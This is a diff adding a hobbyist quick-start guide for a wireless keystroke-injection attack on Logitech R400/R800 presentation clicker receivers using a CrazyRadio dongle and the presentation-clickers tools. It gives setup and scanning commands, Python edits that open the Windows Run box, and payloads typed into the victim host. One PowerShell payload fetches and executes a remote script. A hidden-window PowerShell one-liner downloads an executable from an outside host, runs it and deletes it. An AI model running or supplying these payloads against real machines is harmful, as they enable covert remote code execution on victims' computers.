@@ -1,0 +1,155 @@
+Quick start guide v .01
+------------------
+Os: Ubuntu 18.04 LTS 
+```sudo apt-get update
+sudo apt-get upgrade
+sudo apt-get install sdcc binutils python python-pip
+sudo pip install -U pip
+sudo pip install -U -I pyusb
+sudo pip install -U platformio
+sudo pip install crcmod```
+
+Download and unzip repository 
+https://github.com/marcnewlin/presentation-clickers#Logitech-Unencrypted
+
+In unzipped folder
+```make```
+
+Plug in CrazyRadio PA 
+https://www.amazon.com/SeeedStudio-Crazyradio-2-4Ghz-Dongle-Antenna/dp/B00VYA3A2U/ref=sr_1_2?keywords=crazyradio+pa&qid=1562042216&s=gateway&sr=8-2
+
+```sudo make install```
+
+For logitech R400 and R800 - find address
+```sudo ./tools/nrf24-scanner.py -c {2..74..3} -l```
+
+On target host push the clicker buttons - the play button sends more data at once and is quicker to be picked up
+Packets should look something like this:
+[2019-07-21 12:58:43.466]  32   0  9D:9E:95:52:07  
+[2019-07-21 12:58:43.620]  32  10  9D:9E:95:52:07  00:C1:00:00:00:00:00:00:00:3F
+
+Inject
+On target host where the clicker receiver is plugged in - open note pad or other text editor 
+
+On attack Ubuntu machine run
+```sudo ./tools/preso-injector.py -l -f logitech -a 9D:9E:95:52:07```
+
+If it works correctly it will be all alpha numeric and symbols from payload test. 
+
+To change payload edit presentation-clickers-master -> tools -> preso-injector.py
+At bottom of script starting at # Inject some sample strings
+change strings "text between quotes" and save and run again 
+
+To make it more ducky'esk and pop calc.exe
+edit presentation-clickers-master -> tools -> protocols -> injector.py
+This will allow you to call out the GUI+r (windows+r key to run
+add new def
+```def send_winplusr(self, shift=False, ctrl=False, win=True):
+    self.protocol.send_hid_event(scan_code=0x15, shift=shift, ctrl=ctrl, win=win)
+    self.protocol.send_hid_event(scan_code=0x00)```
+save
+to get the key mapping use https://gist.github.com/MightyPork/6da26e382a7ad91b5496ee55fdc73db2
+
+edit payload edit presentation-clickers-master -> tools -> preso-injector.py
+# Inject some sample strings
+i.start_injection()
+i.send_winplusr()
+time.sleep(1)
+i.inject_string("cmd")
+i.send_enter()
+time.sleep(1)
+i.inject_string("calc.exe")
+i.send_enter()
+i.stop_injection()
+
+save
+
+sleep time is based on speed of host attacking. Can speed up if host is fast and can slow it down if slow
+
+If you get an error like this:
+Traceback (most recent call last):
+  File "./tools/preso-injector.py", line 11, in <module>
+    common.parse_and_init()
+  File "/home/karl/Downloads/presentation-clickers-master/tools/lib/common.py", line 59, in parse_and_init
+    if args.lna: radio.enable_lna()
+  File "/home/karl/Downloads/presentation-clickers-master/tools/lib/nrf24.py", line 146, in enable_lna
+    self.dongle.read(0x81, 64, timeout=nrf24.usb_timeout)
+  File "/usr/local/lib/python2.7/dist-packages/usb/core.py", line 988, in read
+    self.__get_timeout(timeout))
+  File "/usr/local/lib/python2.7/dist-packages/usb/backend/libusb1.py", line 833, in bulk_read
+    timeout)
+  File "/usr/local/lib/python2.7/dist-packages/usb/backend/libusb1.py", line 936, in __read
+    _check(retval)
+  File "/usr/local/lib/python2.7/dist-packages/usb/backend/libusb1.py", line 595, in _check
+    raise USBError(_strerror(ret), ret, _libusb_errno[ret])
+usb.core.USBError: [Errno 110] Operation timed out
+
+Unplug the Crazy Radio and plug it back in and run script again 
+
+
+Rickroll
+# Inject some sample strings
+i.start_injection()
+i.send_winplusr()
+time.sleep(1)
+i.inject_string("powershell")
+i.send_enter()
+time.sleep(2)
+i.inject_string("[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12")
+i.send_enter()
+i.inject_string("iex (New-Object System.Net.WebClient).DownloadString('https://malware.church')")
+i.send_enter()
+i.stop_injection()
+
+--------------------------------------------
+Get USB to run as non-root
+------------------------------------
+
+sudo nano /etc/udev/rules.d/99-crazy
+SUBSYSTEM=="usb", ATTR{idVendor}=="1915", ATTR{idProduct}=="0102", MODE="666"
+
+save 
+
+sudo service udev restart
+-------
+To get USB info 
+lsusb -v
+
+-------------------
+powershell -w h [Net.ServicePointManager]::SecurityProtocol='tls12';(New-Object Net.WebClient).DownloadFile('http://p.nsa.chat','%HOMEPATH%\n.exe');Start-Process -wai -wi mi -f '~\n.exe';Remove-Item -pa '~\n.exe';exit
+
+----------------------------------
+
+Referances 
+
+https://www.jimwilbur.com/2019/03/mousejack-from-mouse-to-shell-part-1/ 
+
+https://github.com/marcnewlin/presentation-clickers/tree/master/prog/usb-flasher 
+
+https://github.com/whid-injector 
+
+https://github.com/marcnewlin/presentation-clickers 
+
+https://github.com/marcnewlin/presentation-clickers/network/members 
+
+https://github.com/jdiazmx/presentation-clickers/blob/master/readme-original.md 
+
+https://github.com/BastilleResearch/mousejack
+
+https://github.com/insecurityofthings/jackit/blob/master/jackit/keymap.py 
+
+https://support.logi.com/hc/en-us/community/posts/360033207154-Logitech-Unifying-Receiver-Update?page=2#comments 
+
+https://support.logi.com/hc/en-us/articles/360035037273-Firmware-Update-Tool 
+
+https://www.syss.de/fileadmin/user_upload/2019_06_04_New_Tales_of_Wireless_Input_Devices_-_CONFidence_2019.pdf
+
+    
+    
+
+
+
+
+
+
+
